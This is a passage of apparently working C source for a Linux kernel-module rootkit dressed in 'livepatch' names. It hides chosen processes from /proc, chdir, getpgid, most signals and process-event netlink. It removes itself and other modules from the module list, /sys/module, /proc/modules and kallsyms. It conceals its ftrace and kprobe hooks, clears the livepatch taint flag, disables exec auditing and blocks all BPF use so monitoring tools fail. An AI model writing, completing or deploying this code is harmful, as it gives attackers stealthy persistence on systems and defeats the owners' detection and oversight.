/*
 */

#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/livepatch.h>
#include <linux/seq_file.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/ptrace.h>
#include <linux/kallsyms.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/mount.h>
#include <linux/proc_fs.h>
#include <linux/proc_ns.h>
#include <linux/refcount.h>
#include <linux/spinlock.h>
#include <linux/atomic.h>
#include <linux/binfmts.h>
#include <linux/sched/coredump.h>
#include <linux/sched/task.h>
#include <linux/bsearch.h>
#include <linux/cn_proc.h>
#include <linux/connector.h>
#include <linux/dynamic_debug.h>
#include <linux/audit.h>
#include <linux/string.h>
#include <linux/ctype.h>
#include <linux/list.h>
#include <linux/kprobes.h>
#include <linux/reboot.h>
#include <linux/fsnotify_backend.h>
#include <linux/version.h>
#include <linux/icmp.h>
#include <linux/mempolicy.h>
#include <linux/namei.h>
#include <linux/wait.h>
//#include "fs/proc/internal.h"
#include "ftrace_hook.h"


#define FIRST_PROCESS_ENTRY 256
#define TGID_OFFSET (FIRST_PROCESS_ENTRY + 2)

typedef struct dentry *instantiate_t(struct dentry *,
                                     struct task_struct *, const void *);
struct tgid_iter {
        unsigned int tgid;
        struct task_struct *task;
};

struct klp_ops {
        struct list_head node;
        struct list_head func_stack;
        struct ftrace_ops fops;
};

#if 0
struct ftrace_func_entry {
        struct hlist_node hlist;
        unsigned long ip;
};
#endif

struct ftrace_hash {
        unsigned long           size_bits;
        struct hlist_head       *buckets;
        unsigned long           count;
        unsigned long           flags;
        struct rcu_head         rcu;
};

struct ftrace_page {
        struct ftrace_page      *next;
        struct dyn_ftrace       *records;
        int                     index;
        int                     size;
};

struct printk_log {
        u64 ts_nsec;            /* timestamp in nanoseconds */
        u16 len;                /* length of entire record */
        u16 text_len;           /* length of text buffer */
        u16 dict_len;           /* length of dictionary buffer */
        u8 facility;            /* syslog facility */
        u8 flags:5;             /* internal record flags */
        u8 level:3;             /* syslog level */
#ifdef CONFIG_PRINTK_CALLER
        u32 caller_id;            /* thread id or processor id */
#endif
};

static struct module *this_module = THIS_MODULE;
#define MAX_NUM_MODULE_NAME 10
static int num_module_name = 0;
static int num_module_list = 0;
static char *hidden_module_name[MAX_NUM_MODULE_NAME] = {NULL,};
struct module *hidden_module_list[MAX_NUM_MODULE_NAME] = {NULL,};
module_param_array(hidden_module_name, charp, &num_module_name, 0644);

static int hidden_base_exe = 0;
module_param(hidden_base_exe, int, 0644);

static int force_modules_disabled = 0;
module_param(force_modules_disabled, int, 0644);

//disable RESTART HALT POWER_OFF KEXEC RESTART2
static int force_reboot_disabled = 0;
module_param(force_reboot_disabled, int, 0644);

//puzzle kprobe 
static int force_kprobe_puzzle = 1;
module_param(force_kprobe_puzzle, int, 0644);

#define KHTREAD_PROC_NAME "kthread_proc"
#define MAX_NUM_PROC_NAME 10
static int num_proc_name = 3;
static char *hidden_proc_name[MAX_NUM_PROC_NAME] = {KHTREAD_PROC_NAME, "hidden_comm", "touch", "rm"};
module_param_array(hidden_proc_name, charp, &num_proc_name, 0644);

static char hidden_msg_klog[] = "hidden_proc";
static char **p_log_buf = NULL;
static raw_spinlock_t *p_logbuf_lock = NULL;
static u64 *p_clear_seq = NULL;
static u32 *p_clear_idx = NULL;
static u64 *p_log_next_seq = NULL;
static u32 *p_log_next_idx = NULL;
static void (*p__printk_safe_enter)(void) = NULL;
static void (*p__printk_safe_exit)(void) = NULL;

static struct tgid_iter (*p_next_tgid)(struct pid_namespace *ns, struct tgid_iter iter) = NULL;
//static bool (*p_ptrace_may_access)(struct task_struct *task, unsigned int mode) = NULL;
static bool (*p_proc_fill_cache)(struct file *file, struct dir_context *ctx,
		const char *name, unsigned int len,
		instantiate_t instantiate, struct task_struct *task, const void *ptr) = NULL;

static struct dentry * (*p_proc_pid_instantiate)(struct dentry * dentry,
                                   struct task_struct *task, const void *ptr) = NULL;

static unsigned (*p_name_to_int)(const struct qstr *qstr) = NULL;
static struct task_struct *(*p_find_task_by_pid_ns)(pid_t nr, struct pid_namespace *ns) = NULL;

//static void (*p___audit_bprm)(struct linux_binprm *bprm) = NULL;

//static int old_modules_disabled = 0;
//static int *p_modules_disabled = NULL;
static struct list_head *p_modules = NULL;
static char * (*p_module_flags)(struct module *mod, char *buf) = NULL;
static bool (*p_kallsyms_show_value)(const struct cred *cred) = NULL;
static struct module *(*p_module_address)(unsigned long addr) = NULL;

static int (*p_ddebug_remove_module)(const char *mod_name) = NULL;

static const struct kernel_symbol *p__start___ksymtab = NULL;
static const struct kernel_symbol *p__stop___ksymtab = NULL;

//user tainted mask 
static unsigned long usr_tainted_mask = 0;
module_param(usr_tainted_mask, ulong, 0644);
static unsigned long *p_tainted_mask = NULL;

//static struct ftrace_ops __rcu **p_ftrace_ops_list = NULL;
//static struct ftrace_ops *p_ftrace_list_end = NULL;
static struct mutex *p_ftrace_lock = NULL;
static struct klp_ops * (*p_klp_find_ops)(void *old_func) = NULL;
static struct ftrace_func_entry *(*p_ftrace_lookup_ip)(struct ftrace_hash *hash, unsigned long ip) = NULL;
static struct ftrace_page       **p_ftrace_pages_start = NULL;


static int (*p_group_send_sig_info)(int sig, struct kernel_siginfo *info,
                        struct task_struct *p, enum pid_type type) = NULL;

static int (*p_security_task_getpgid)(struct task_struct *p) = NULL;
static struct task_struct * (*p_find_task_by_vpid)(pid_t vnr) = NULL;

static void (*p_free_uid)(struct user_struct *up) = NULL;
static struct user_struct *(*p_find_user)(kuid_t uid) = NULL;

static rwlock_t *p_tasklist_lock = NULL;

static struct ftrace_ops *p_kprobe_ftrace_ops = NULL;
static struct ftrace_ops *p_kprobe_ipmodify_ops = NULL;

static int (*p_kernel_text_address)(unsigned long addr) = NULL;

static struct module* (*p_find_module)(const char *name) = NULL;

static asmlinkage bool (*real_ptrace_may_access)(struct task_struct *task, unsigned int mode);


/*
 No export the func <kallsyms_lookup_name> from v5.7.1
*/
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 1)

/* Symbol table format returned by kallsyms. */
typedef struct __ksymtab {
	unsigned long value;    /* Address of symbol */
	const char *mod_name;   /* Module containing symbol or
				 * "kernel" */
	unsigned long mod_start;
	unsigned long mod_end;
	const char *sec_name;   /* Section containing symbol */
	unsigned long sec_start;
	unsigned long sec_end;
	const char *sym_name;   /* Full symbol name, including
				 * any version */
	unsigned long sym_start;
	unsigned long sym_end;
} kdb_symtab_t;

int kdbgetsymval(const char *symname, kdb_symtab_t *symtab);

unsigned long find_kallsyms_addr(const char *name)
{
        kdb_symtab_t symtab; 
        unsigned long addr = 0;
        if (!name)
                goto end;

        if (kdbgetsymval(name, &symtab))
                addr = symtab.sym_start;
end:
        return addr;

}

#define kallsyms_lookup_addr find_kallsyms_addr

#endif

struct load_info {
        const char *name;
        /* pointer to module in temporary copy, freed at end of load_module() */
        struct module *mod;
        Elf_Ehdr *hdr;
        unsigned long len;
        Elf_Shdr *sechdrs;
        char *secstrings, *strtab;
        unsigned long symoffs, stroffs, init_typeoffs, core_typeoffs;
        struct _ddebug *debug;
        unsigned int num_debug;
        bool sig_ok;
#ifdef CONFIG_KALLSYMS
        unsigned long mod_kallsyms_init_off;
#endif
        struct {
                unsigned int sym, str, mod, vers, info, pcpu;
        } index;
};

static bool has_pid_permissions(struct pid_namespace *pid,
                                 struct task_struct *task,
                                 int hide_pid_min)
{
        if (pid->hide_pid < hide_pid_min)
                return true;
        if (in_group_p(pid->pid_gid))
                return true;
        //return p_ptrace_may_access(task, PTRACE_MODE_READ_FSCREDS);
        return real_ptrace_may_access(task, PTRACE_MODE_READ_FSCREDS);
}

static int get_task_exe(char *buf, int buflen, struct task_struct *task)
{
        int ret = -1;
        struct file *exe_file = NULL;
        char *p = NULL;

        exe_file = get_task_exe_file(task);
        if (exe_file) {
                p = d_path(&(exe_file->f_path), buf, buflen - 1);
                fput(exe_file);

                if (IS_ERR_OR_NULL(p)) {
                        ret = -1;
                } else {
                        ret = strlen(p);
                        memmove(buf, p, ret);
                        buf[ret] = '\0';
                }
        }

        return ret;
}

static int is_hidden_proc_name(const char *name, int len_name)
{
	int i = 0;

	if (!name || len_name <= 0)
		goto end;

	for (i = 0; i < num_proc_name; i++) {
		if (hidden_proc_name[i] == NULL)
			break;
		if (strncmp(name, hidden_proc_name[i], len_name) == 0) {
			return 1;
		}
	}

end:
	return 0;
}

static __attribute__((unused)) void print_hidden_proc_name(void)
{
	int i = 0;

	printk(KERN_INFO "hidden_proc_name:");
	for (i = 0; i < num_proc_name; i++) {
		if (hidden_proc_name[i] == NULL)
			break;
		printk(KERN_INFO " %s", hidden_proc_name[i]);
	}
	printk(KERN_INFO "\n");

	return;
}

static __attribute__((unused)) void print_hidden_module_name(void)
{
	int i = 0;

	printk(KERN_INFO "hidden_module_name %d:", num_module_name);
	for (i = 0; i < num_module_name; i++) {
		if (hidden_module_name[i] == NULL)
			break;
		printk(KERN_INFO " %s", hidden_module_name[i] ? : "");
	}

	printk(KERN_INFO "hidden_module_list %d:", num_module_list);
	for (i = 0; i < num_module_list; i++) {
		if (hidden_module_list[i] == NULL)
			break;
		printk(KERN_INFO " %pX", hidden_module_list[i]);
	}

	return;
}

static int is_hidden_proc(struct task_struct *task) 
{
	int ret = 0;
	char *exe_buf = NULL;

	if (unlikely(!(task->flags & PF_KTHREAD)) && hidden_base_exe) {
		exe_buf = kmalloc(PATH_MAX, GFP_KERNEL);
		if (exe_buf) {
			if (get_task_exe(exe_buf, sizeof(exe_buf), task) > 0) {
				if (is_hidden_proc_name(exe_buf, sizeof(exe_buf)))
					ret = 1;
			}
			kfree(exe_buf);
		}
	} else {
		if (is_hidden_proc_name(task->comm, sizeof(task->comm)))
			ret = 1;
	}

	return ret;
}

static int is_hidden_proc_pid(pid_t pid) 
{
        struct task_struct *task = NULL;
	int ret = 0;

        rcu_read_lock();
	task = p_find_task_by_vpid(pid);
        if (task)
                get_task_struct(task);
        rcu_read_unlock();
        if (!task)
                goto end;

	if (is_hidden_proc(task)) 
		ret = 1;
	put_task_struct(task);

end:
	return ret;
}

static void hidden_module(struct module *mod) {
	//del from 'modules' list
	list_del(&mod->list);

	//del from /sys/module/
	if (mod->holders_dir && mod->holders_dir->parent) {                 
		kobject_del(mod->holders_dir->parent);                           
	}     

	p_ddebug_remove_module(mod->name);

	if (num_module_list < MAX_NUM_MODULE_NAME)
		hidden_module_list[num_module_list++] = mod;
}

static void hidden_modules(void)
{
	int i = 0;
	char *name = NULL;
	struct module *m = NULL;

	if (num_module_name < MAX_NUM_MODULE_NAME)
		hidden_module_name[num_module_name++] = kstrdup(THIS_MODULE->name, GFP_KERNEL);
	else
		hidden_module_name[num_module_name-1] = kstrdup(THIS_MODULE->name, GFP_KERNEL);

	while (i < num_module_name) {
		name = hidden_module_name[i];
		if (name && (m = p_find_module(name)))
			hidden_module(m);
		i++;
	}
}

static int is_hidden_module(struct module *m)
{
	int i = 0;
	int ret = 0;

	if (!m)
		goto end;
	for (i=0; i<num_module_list; i++) {
		if (hidden_module_list[i] == m) {
			ret = 1;
			goto end;
		}
	}
end:
	return ret;
}

static int is_hidden_module_name(const char *name)
{
	int i = 0;
	int ret = 0;

	if (!name)
		goto end;

	for (i=0; i<num_module_name; i++) {
		if (strcmp(hidden_module_name[i], name) == 0) {
			ret = 1;
			goto end;
		}
	}
end:
	return ret;
}

static int is_in_hidden_module_list(const char *name)
{
	int i = 0;
	int ret = 0;

	if (!name)
		goto end;
	for (i=0; i<num_module_list; i++) {
		if (hidden_module_list[i]
			 && strcmp(hidden_module_list[i]->name, name) == 0) {
			ret = 1;
			goto end;
		}
	}
end:
	return ret;
}

static struct dentry *livepatch_proc_pid_lookup(struct dentry *dentry, unsigned int flags)
{ 
        struct task_struct *task;
        unsigned tgid; 
        struct pid_namespace *ns;
        struct dentry *result = ERR_PTR(-ENOENT);

        tgid = p_name_to_int(&dentry->d_name);
        if (tgid == ~0U)
                goto out;

        ns = dentry->d_sb->s_fs_info;
        rcu_read_lock();
        task = p_find_task_by_pid_ns(tgid, ns);
        if (task)
                get_task_struct(task);
        rcu_read_unlock();
        if (!task)
                goto out;

	if (is_hidden_proc(task)) {
		put_task_struct(task);
		goto out;
	}

        result = p_proc_pid_instantiate(dentry, task, NULL);
        put_task_struct(task);
out:
        return result;
}

static int livepatch_proc_pid_readdir(struct file *file, struct dir_context *ctx)
{
        struct tgid_iter iter;
        struct pid_namespace *ns = proc_pid_ns(file_inode(file));
        loff_t pos = ctx->pos;

        if (pos >= PID_MAX_LIMIT + TGID_OFFSET)
                return 0;

        if (pos == TGID_OFFSET - 2) {
                struct inode *inode = d_inode(ns->proc_self);
                if (!dir_emit(ctx, "self", 4, inode->i_ino, DT_LNK))
                        return 0;
                ctx->pos = pos = pos + 1;
        }
        if (pos == TGID_OFFSET - 1) {
                struct inode *inode = d_inode(ns->proc_thread_self);
                if (!dir_emit(ctx, "thread-self", 11, inode->i_ino, DT_LNK))
                        return 0;
                ctx->pos = pos = pos + 1;
        }

        iter.tgid = pos - TGID_OFFSET;
        iter.task = NULL;
        for (iter = p_next_tgid(ns, iter);
             iter.task;
             iter.tgid += 1, iter = p_next_tgid(ns, iter)) {
                char name[10 + 1];
                unsigned int len;

                cond_resched();
                if (!has_pid_permissions(ns, iter.task, HIDEPID_INVISIBLE))
                        continue;

		if (is_hidden_proc(iter.task))
			continue;

                len = snprintf(name, sizeof(name), "%u", iter.tgid);
                ctx->pos = iter.tgid + TGID_OFFSET;
                if (!p_proc_fill_cache(file, ctx, name, len,
                                     p_proc_pid_instantiate, iter.task, NULL)) {
                        put_task_struct(iter.task);
                        return 0;
                }
        }
        ctx->pos = PID_MAX_LIMIT + TGID_OFFSET;
        return 0;
}

/*
 * hidden the kernel module from /proc/modules
 */
static void *m_start(struct seq_file *m, loff_t *pos)
{
        mutex_lock(&module_mutex);
        return seq_list_start(p_modules, *pos);
}

static void *m_next(struct seq_file *m, void *p, loff_t *pos)
{
        return seq_list_next(p, p_modules, pos);
}

static void m_stop(struct seq_file *m, void *p)
{
        mutex_unlock(&module_mutex);
}

static inline void print_unload_info(struct seq_file *m, struct module *mod)
{
        struct module_use *use;
        int printed_something = 0;

        seq_printf(m, " %i ", module_refcount(mod)); 

        /*
         * Always include a trailing , so userspace can differentiate
         * between this and the old multi-field proc format.
         */
        list_for_each_entry(use, &mod->source_list, source_list) {
                printed_something = 1;
                seq_printf(m, "%s,", use->source->name);
        }

        if (mod->init != NULL && mod->exit == NULL) {
                printed_something = 1;
                seq_puts(m, "[permanent],");
        }

        if (!printed_something)
                seq_puts(m, "-");
}

#define MODULE_FLAGS_BUF_SIZE (TAINT_FLAGS_COUNT + 4)
static int m_show(struct seq_file *m, void *p)
{
        struct module *mod = list_entry(p, struct module, list);
        char buf[MODULE_FLAGS_BUF_SIZE];
        void *value;

        /* We always ignore unformed modules. */
        if (mod->state == MODULE_STATE_UNFORMED)
                return 0;

	if (is_hidden_module(mod))
		return 0;

        seq_printf(m, "%s %u",
                   mod->name, mod->init_layout.size + mod->core_layout.size);
        print_unload_info(m, mod);

        /* Informative for users. */
        seq_printf(m, " %s",
                   mod->state == MODULE_STATE_GOING ? "Unloading" :
                   mod->state == MODULE_STATE_COMING ? "Loading" :
                   "Live");
        /* Used by oprofile and other similar tools. */
        value = m->private ? NULL : mod->core_layout.base;
        seq_printf(m, " 0x%px", value);

        /* Taints info */
        if (mod->taints)
                seq_printf(m, " %s", p_module_flags(mod, buf));
                
        seq_puts(m, "\n");
        return 0;
}

static const struct seq_operations modules_op = {
        .start  = m_start,
        .next   = m_next,
        .stop   = m_stop,
        .show   = m_show
};

static int livepatch_modules_open(struct inode *inode, struct file *file)
{
        int err = seq_open(file, &modules_op);

        if (!err) {
                struct seq_file *m = file->private_data;
                m->private = p_kallsyms_show_value(file->f_cred) ? NULL : (void *)8ul;
        }

        return err;
}

/*
 * hidden the kernel module from /proc/modules
 */

static unsigned long kernel_symbol_value(const struct kernel_symbol *sym)
{
#ifdef CONFIG_HAVE_ARCH_PREL32_RELOCATIONS
        return (unsigned long)offset_to_ptr(&sym->value_offset);
#else
        return sym->value;
#endif
}

static const char *kallsyms_symbol_name(struct mod_kallsyms *kallsyms, unsigned int symnum)
{
        return kallsyms->strtab + kallsyms->symtab[symnum].st_name;
}

static const char *kernel_symbol_name(const struct kernel_symbol *sym)
{
#ifdef CONFIG_HAVE_ARCH_PREL32_RELOCATIONS
        return offset_to_ptr(&sym->name_offset);
#else
        return sym->name;
#endif
}

static int cmp_name(const void *name, const void *sym)
{
        return strcmp(name, kernel_symbol_name(sym));
}

static const struct kernel_symbol *lookup_exported_symbol(const char *name,
                                                          const struct kernel_symbol *start,
                                                          const struct kernel_symbol *stop)
{
        return bsearch(name, start, stop - start,
                        sizeof(struct kernel_symbol), cmp_name);
}

static int is_exported(const char *name, unsigned long value,
                       const struct module *mod)
{
        const struct kernel_symbol *ks;
        if (!mod)
                ks = lookup_exported_symbol(name, p__start___ksymtab, p__stop___ksymtab);
        else
                ks = lookup_exported_symbol(name, mod->syms, mod->syms + mod->num_syms);

        return ks != NULL && kernel_symbol_value(ks) == value;
}

static int livepatch_module_get_kallsym(unsigned int symnum, unsigned long *value, char *type,
                        char *name, char *module_name, int *exported)
{
        struct module *mod;

        preempt_disable();
        list_for_each_entry_rcu(mod, p_modules, list) {
                struct mod_kallsyms *kallsyms;

		if (is_hidden_module(mod))
                        continue;

                if (mod->state == MODULE_STATE_UNFORMED)
                        continue;

                kallsyms = rcu_dereference_sched(mod->kallsyms);
                if (symnum < kallsyms->num_symtab) {
                        const Elf_Sym *sym = &kallsyms->symtab[symnum];

                        *value = kallsyms_symbol_value(sym);
                        *type = kallsyms->typetab[symnum];
                        strlcpy(name, kallsyms_symbol_name(kallsyms, symnum), KSYM_NAME_LEN);
                        strlcpy(module_name, mod->name, MODULE_NAME_LEN);
                        *exported = is_exported(name, *value, mod);
                        preempt_enable();
                        return 0;
                }
                symnum -= kallsyms->num_symtab;
        }
        preempt_enable();
        return -ERANGE;
}

/*
 * bypass the cn_proc about the hidden proc msg
 */
static int livepatch_cn_netlink_send(struct cn_msg *msg, u32 portid, u32 __group,
        gfp_t gfp_mask)
{
	struct task_struct *task = current;
	struct proc_event *ev = NULL;

	if (__group != CN_IDX_PROC) 
		goto send;

	ev = (struct proc_event *)msg->data;
	if (ev->what == PROC_EVENT_EXEC && is_hidden_proc(task))
		return 0;

send:
	return cn_netlink_send_mult(msg, msg->len, portid, __group, gfp_mask);
}

static void livepatch__audit_bprm(struct linux_binprm *bprm)
{
	return;
}

static int livepatch_kill_pid_info(int sig, struct kernel_siginfo *info, struct pid *pid)
{
        int error = -ESRCH;
        struct task_struct *p;

	rcu_read_lock();
	p = pid_task(pid, PIDTYPE_PID);
	if (p && is_hidden_proc(p) && sig != SIGKILL) {
		rcu_read_unlock();
		return error;
	}
	rcu_read_unlock();

        for (;;) {
                rcu_read_lock();
                p = pid_task(pid, PIDTYPE_PID);
                if (p)
                        error = p_group_send_sig_info(sig, info, p, PIDTYPE_TGID);
                rcu_read_unlock();
                if (likely(!p || error != -ESRCH))
                        return error;

                /*
                 * The task was unhashed in between, try again.  If it
                 * is dead, pid_task() will return NULL, if we race with
                 * de_thread() it will find the new leader.
                 */
        }
}

static int livepatch_do_getpgid(pid_t pid)
{
        struct task_struct *p;
        struct pid *grp;
        int retval;

        rcu_read_lock();
        if (!pid)
                grp = task_pgrp(current);
        else {
                retval = -ESRCH;
                p = p_find_task_by_vpid(pid);
                if (!p)
                        goto out;

		get_task_struct(p);
		if (is_hidden_proc(p)) {
			put_task_struct(p);
			goto out;
		}
		put_task_struct(p);

                grp = task_pgrp(p);
                if (!grp)
                        goto out;

                retval = p_security_task_getpgid(p);
                if (retval)
                        goto out;
        }
        retval = pid_vnr(grp);
out:
        rcu_read_unlock();
        return retval;
}


static void (*p_set_fs_pwd)(struct fs_struct *fs, const struct path *path) = NULL;
static struct task_struct *(*p_find_get_task_by_vpid)(pid_t nr) = NULL;
static struct filename * (*p_getname)(const char __user * filename)  = NULL;
static void (*p_putname)(struct filename *name) = NULL;

static int livepatch_ksys_chdir(const char __user *filename)
{
        struct path path;
        int error = 0;
        unsigned int lookup_flags = LOOKUP_FOLLOW | LOOKUP_DIRECTORY;
retry:
        error = user_path_at(AT_FDCWD, filename, lookup_flags, &path);
        if (error)
                goto out;

	if (strcmp(path.mnt->mnt_sb->s_type->name, "proc") == 0) {
		char *str = NULL;
		char *p = NULL;
		struct task_struct *task = NULL;
		pid_t pid = 0;
		struct filename *name = p_getname(filename);
		if (name)
			p = (char *)name->name;

		while (p && (str = strsep(&p, "/")) != NULL) {
			if (strlen(str) == 0)
				continue;
			pid = 0;
			if (sscanf(str, "%d", &pid) != 1 || pid <= 0)
				continue;

			task = p_find_get_task_by_vpid(pid);
			if (task) { 
				if (is_hidden_proc(task)) 
					error = -ENOENT;
				put_task_struct(task);
				if (error)
					break;  
			}
		}
		if (name)
			p_putname(name);

		if (error) {
			path_put(&path);
			goto out;
		}
	}

        error = inode_permission(path.dentry->d_inode, MAY_EXEC | MAY_CHDIR);
        if (error)
                goto dput_and_out;
        
        p_set_fs_pwd(current->fs, &path);

dput_and_out:
        path_put(&path);
        if (retry_estale(error, lookup_flags)) {
                lookup_flags |= LOOKUP_REVAL;
                goto retry;
        }
out:
        return error;
}

static int livepatch_security_bpf(int cmd, union bpf_attr *attr, unsigned int size)
{
	return -EPERM;
}

static void hidden_from_sys_livepatch(struct klp_patch *klp) 
{
	if (!klp)
		goto end;

	kobject_del(&klp->kobj);
	list_del(&klp->list);
end:
	return;
}

static void clear_livepatch_tainted_mask(void)
{
	struct module *mod = NULL;

	if (usr_tainted_mask != 0) {
		*p_tainted_mask = usr_tainted_mask;
		return;
	}

	preempt_disable();
        list_for_each_entry_rcu(mod, p_modules, list) {
		if (mod != this_module && is_livepatch_module(mod))
			goto out;
	}
	clear_bit(TAINT_LIVEPATCH, p_tainted_mask);
out:
        preempt_enable();
	return;
}

#if 0
static int remove_ftrace_ops(struct ftrace_ops *ops)
{
        struct ftrace_ops **p;

        /*
         * If we are removing the last function, then simply point
         * to the ftrace_stub.
         */
        if (rcu_dereference_protected(*p_ftrace_ops_list,
                        lockdep_is_held(p_ftrace_lock)) == ops &&
            rcu_dereference_protected(ops->next,
                        lockdep_is_held(p_ftrace_lock)) == p_ftrace_list_end) {
                *p_ftrace_ops_list = p_ftrace_list_end;
                return 0;
        }

        for (p = p_ftrace_ops_list; *p != p_ftrace_list_end; p = &(*p)->next)
                if (*p == ops)
                        break;

        if (*p != ops)
                return -1;

        *p = (*p)->next;
        return 0;
}
#endif

#define do_for_each_ftrace_rec(pg, rec)                                 \
        for (pg = *p_ftrace_pages_start; pg; pg = pg->next) {              \
                int _____i;                                             \
                for (_____i = 0; _____i < pg->index; _____i++) {        \
                        rec = &pg->records[_____i];

#define while_for_each_ftrace_rec()             \
                }                               \
        }


static void hidden_ftrace_ops(struct ftrace_ops *fops)
{
	struct ftrace_hash *hash = NULL;
	//struct ftrace_func_entry *entry = NULL;
	struct ftrace_page *pg = NULL;
	struct dyn_ftrace *rec = NULL;

	if (!fops)
		return;

	mutex_lock(p_ftrace_lock);

	hash = fops->func_hash->filter_hash ;
	do_for_each_ftrace_rec(pg, rec) {
		if (p_ftrace_lookup_ip(hash, rec->ip)) {
			rec->flags &= ~FTRACE_FL_ENABLED;
			rec->flags &= FTRACE_FL_MASK;
		}
	} while_for_each_ftrace_rec();

	mutex_unlock(p_ftrace_lock);

#if 0
	entry = p_ftrace_lookup_ip(hash, ftrace_loc);
	if (entry) {
		hlist_del(&entry->hlist);
		hash->count--;
	}

	remove_ftrace_ops(fops);
	fops->flags &= ~FTRACE_OPS_FL_ENABLED;
#endif
}

static void hidden_from_enabled_functions_ftrace_hooks(struct ftrace_hook *hooks, int num)
{
	int i = 0;

	if (!hooks || num <= 0) 
		return;

	for (i = 0; i < num; i++) 
		hidden_ftrace_ops(&(hooks[i].ops));

	return;
}


static void hidden_ftrace_ops_addr(struct ftrace_ops *fops, kprobe_opcode_t *addr)
{
	struct ftrace_hash *hash = NULL;
	//struct ftrace_func_entry *entry = NULL;
	struct ftrace_page *pg = NULL;
	struct dyn_ftrace *rec = NULL;

	if (!fops)
		return;

	mutex_lock(p_ftrace_lock);

	hash = fops->func_hash->filter_hash ;
	do_for_each_ftrace_rec(pg, rec) {
		if (rec->ip == (unsigned long)addr && p_ftrace_lookup_ip(hash, rec->ip)) {
			rec->flags &= ~FTRACE_FL_ENABLED;
			rec->flags &= FTRACE_FL_MASK;
		}
	} while_for_each_ftrace_rec();

	mutex_unlock(p_ftrace_lock);
}

static void hidden_from_enabled_functions_kprobe(struct kretprobe **rps, int num)
{
	int i = 0;
	bool ipmodify ;

	for (i = 0; i < num; i++) {
		ipmodify = (rps[i]->kp.post_handler != NULL);

		if (ipmodify)
			hidden_ftrace_ops_addr(p_kprobe_ipmodify_ops, rps[i]->kp.addr);
		else
			hidden_ftrace_ops_addr(p_kprobe_ftrace_ops, rps[i]->kp.addr);
	}

	return;
}

static void hidden_from_enabled_functions_klp(struct klp_object *obj )
{
	struct klp_func *func = NULL;
	struct klp_ops *ops = NULL;
	struct ftrace_ops *fops = NULL;
	unsigned long ftrace_loc;

	klp_for_each_func(obj, func) {
		ops = p_klp_find_ops(func->old_func);
		if (!ops)  
			continue;

		fops = &ops->fops;

		ftrace_loc = (unsigned long)func->old_func;
		if (!ftrace_loc) 
			continue;

		hidden_ftrace_ops(fops);
        }
}

#if 0
static struct printk_log *log_from_idx(u32 idx)
{
        struct printk_log *msg = (struct printk_log *)(*p_log_buf + idx);

        /*
         * A length == 0 record is the end of buffer marker. Wrap around and
         * read the message at the start of the buffer.
         */
        if (!msg->len) 
                return (struct printk_log *)(*p_log_buf);
        return msg; 
}

static u32 log_next(u32 idx)
{
        struct printk_log *msg = (struct printk_log *)(*p_log_buf + idx);

        /* length == 0 indicates the end of the buffer; wrap */
        /*
         * A length == 0 record is the end of buffer marker. Wrap around and
         * read the message at the start of the buffer as *this* one, and
         * return the one after that.
         */ 
        if (!msg->len) {
                msg = (struct printk_log *)(*p_log_buf);
                return msg->len;
        }
        return idx + msg->len;
}
#endif

static char *log_text(const struct printk_log *msg) 
{
        return (char *)msg + sizeof(struct printk_log);
}

#if 0
#define printk_safe_enter_irq()         \
        do {                                    \
                local_irq_disable();            \
                p__printk_safe_enter();          \
        } while (0)

#define printk_safe_exit_irq()                  \
        do {                                    \
                p__printk_safe_exit();           \
                local_irq_enable();             \
        } while (0)

#define logbuf_lock_irq()                               \
        do {                                            \
                printk_safe_enter_irq();                \
                raw_spin_lock(p_logbuf_lock);            \
        } while (0)

#define logbuf_unlock_irq()                             \
        do {                                            \
                raw_spin_unlock(p_logbuf_lock);          \
                printk_safe_exit_irq();                 \
        } while (0)

#define printk_safe_enter_irqsave(flags)        \
        do {                                    \
                local_irq_save(flags);          \
                p__printk_safe_enter();          \
        } while (0)

#define printk_safe_exit_irqrestore(flags)      \
        do {                                    \
                p__printk_safe_exit();           \
                local_irq_restore(flags);       \
        } while (0)

#define logbuf_lock_irqsave(flags)                      \
        do {                                            \
                printk_safe_enter_irqsave(flags);       \
                raw_spin_lock(p_logbuf_lock);            \
        } while (0)

#define logbuf_unlock_irqrestore(flags)         \
        do {                                            \
                raw_spin_unlock(p_logbuf_lock);          \
                printk_safe_exit_irqrestore(flags);     \
        } while (0)


static void (*p_console_lock)(void) = NULL;
static void (*p_console_unlock)(void) = NULL;
static void (*p_wake_up_klogd)(void) = NULL;
static void clear_klog(void)
{
	u64 seq;
	u32 idx;
	unsigned long flags;
//#if 0
	u64 sum_seq = 0;
	u32 sum_idx = 0;
	int first = 0;
//#endif
	logbuf_lock_irqsave(flags);	
	seq = *p_clear_seq;
	idx = *p_clear_idx;
	while (seq < *p_log_next_seq) {
		struct printk_log *msg = log_from_idx(idx);
		char *text = log_text(msg);

		idx = log_next(idx);
		seq++;

		if (first == 0) {
			if (msg->text_len >= sizeof(hidden_msg_klog)) {
				if (strstr(text, hidden_msg_klog)) { 
					first = 1;
					sum_seq++;
					sum_idx += msg->len;
					msg->text_len = 0;
					msg->dict_len = 0;
					msg->len = 0;
				}
			}
//#if 0
		} else {
			sum_seq++;
			sum_idx += msg->len;
		}
//#endif
	}

//#if 0
	if (*p_log_next_seq > sum_seq) {
		*p_log_next_seq -= sum_seq;
		if (*p_log_next_idx > sum_idx)
			*p_log_next_idx -= sum_idx;

		preempt_disable();
		/*
		 * Try to acquire and then immediately release the console
		 * semaphore.  The release will print out buffers and wake up
		 * /dev/kmsg and syslog() users.
		 */
		//if (p_console_trylock_spinning())
		p_console_lock();
		p_console_unlock();
		preempt_enable();
		p_wake_up_klogd();
	}
//	if (*p_log_next_idx > sum_idx)
//		*p_log_next_idx -= sum_idx;
	
//#endif
	logbuf_unlock_irqrestore(flags);
}
#endif

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*real_sched_getaffinity)(struct pt_regs *regs) = NULL;
static asmlinkage long ftrace_sched_getaffinity(struct pt_regs *regs)
{
	return real_sched_getaffinity(regs);
}

static asmlinkage long (*real_security_task_getscheduler)(struct pt_regs *regs) = NULL;
static asmlinkage long ftrace_security_task_getscheduler(struct pt_regs *regs)
{
	return real_security_task_getscheduler(regs);
}

static asmlinkage long (*real_do_sched_setscheduler)(struct pt_regs *regs) = NULL;
static asmlinkage long ftrace_do_sched_setscheduler(struct pt_regs *regs)
{
	return real_do_sched_setscheduler(regs);
}

